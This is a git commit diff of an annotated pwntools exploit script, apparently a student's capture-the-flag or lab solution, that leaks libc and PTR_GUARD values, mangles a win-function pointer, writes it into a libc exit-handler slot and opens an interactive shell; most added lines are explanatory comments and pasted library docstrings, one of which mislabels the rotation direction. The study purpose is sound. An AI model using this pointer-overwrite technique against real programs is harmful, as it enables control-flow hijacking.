def92d1a145fea70d571268ef88b628fa6931326
glassrouter <rincess@snu.ac.kr>
2025-10-05 23:26:36 +0900

    Update LibcAndOOBmyCommentary.py

--- Libc and OOB/LibcAndOOBmyCommentary.py
+++ Libc and OOB/LibcAndOOBmyCommentary.py
@@ -41,22 +41,72 @@ x << y -> shift x left by y bits (moves bits left, new low bits = 0).
 
 def mangle(addr):
     return rorl(addr ^ PTR_GUARD, 0x11)
+#this was addressed in lines 18-24
+"""recvuntil(delims, drop=False, timeout=default) -> bytes
 
+        Receive data until one of `delims` is encountered.
 
-p.recvuntil(b": 0x")
-libc = int(p.recvline(keepends=False).decode(), 16) - 0x29CA8
+        If the request is not satisfied before ``timeout`` seconds pass,
+        all data is buffered and an empty string (``''``) is returned.
+
+        arguments:
+            delims(bytes,tuple): Byte-string of delimiters characters, or list of delimiter byte-strings.
+            drop(bool): Drop the ending.  If :const:`True` it is removed from the end of the return value.
+
+        Raises:
+            exceptions.EOFError: The connection closed before the request could be satisfied
+
+        Returns:
+            A string containing bytes received from the socket,
+            or ``''`` if a timeout occurred while waiting.
+            https://github.com/Gallopsled/pwntools/blob/77b4f06b07/pwnlib/tubes/tube.py#L281-L369"""
+
+"""recvline(keepends=True, timeout=default) -> bytes
+
+        Receive a single line from the tube.
+
+        A "line" is any sequence of bytes terminated by the byte sequence
+        set in :attr:`newline`, which defaults to ``b'\n'``.
+
+        If the connection is closed (:class:`EOFError`) before a newline
+        is received, the buffered data is returned by default and a warning
+        is logged. If the buffer is empty, an :class:`EOFError` is raised.
+        This behavior can be changed by setting :meth:`pwnlib.context.ContextType.throw_eof_on_incomplete_line`.
+
+        If the request is not satisfied before ``timeout`` seconds pass,
+        all data is buffered and an empty byte string (``b''``) is returned.
+
+        Arguments:
+            keepends(bool): Keep the line ending (:const:`True`).
+            timeout(int): Timeout
+
+        Raises:
+            :class:`EOFError`: The connection closed before the request
+                                 could be satisfied and the buffer is empty
+
+        Return:
+            All bytes received over the tube until the first
+            newline ``'\n'`` is received.  Optionally retains
+            the ending. If the connection is closed before a newline
+            is received, the remaining data received up to this point
+            is returned."""
+
+p.recvuntil(b": 0x") #Waits and reads (consumes) everything from the process output up to and including the exact bytes : 0x. It stops right after the 0x, so the next read will start with the hex digits.
+libc = int(p.recvline(keepends=False).decode(), 16) - 0x29CA8 #Reads the rest of that line (until \n). keepends=False removes the trailing \n from the returned bytes.
 
 p.recvuntil(b": 0x")
 win_leak = int(p.recvline(keepends=False).decode(), 16)
 
 p.recvuntil(b": 0x")
-PTR_GUARD = int(p.recvline(keepends=False).decode(), 16)
+PTR_GUARD = int(p.recvline(keepends=False).decode(), 16) # i suppose it is for mangling..
+#at first i thought they are all very similar.. and they are, but in libc 0x29CA8 is substracted.. to convert to the libc base?
 
+# !!! https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-1-14ad4a27aeef !!!
 
 initial = libc + 0x1E9000
-payload = mangle(win_leak)
+payload = mangle(win_leak) # create the mangled form of win_leak (addr ^ PTR_GUARD, rotate left 17)
 
-p.sendafter(b": ", p64(initial + 0x18))
-p.sendafter(b": ", p64(payload))
+p.sendafter(b": ", p64(initial + 0x18)) # wait for ": " then send 8-byte little-endian address of the target slot (initial+0x18)
+p.sendafter(b": ", p64(payload)) # wait for ": " then send the 8-byte mangled pointer to be written there
 
-p.interactive()
+p.interactive() # give you interactive control (so you can use a shell if exploit succeeds)
